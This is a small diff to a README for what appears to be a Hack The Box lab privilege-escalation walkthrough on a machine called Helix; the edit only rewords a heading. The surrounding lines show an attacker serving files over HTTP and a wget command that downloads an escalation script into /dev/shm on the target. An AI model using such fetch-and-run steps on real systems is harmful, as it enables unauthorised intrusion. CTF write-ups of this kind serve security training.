@@ -9,7 +9,7 @@ cd Helix_PrivilegeEscal_toRoot
 python3 -m http.server 80
 ```
 
-### Inside Helix terminal (SSH using 'operator' user)
+### Inside Helix terminal (SSH use 'operator')
 
 ```sh
 wget http://(YOUR_HTB_IP)/privilege_escalationHelix.py /dev/shm
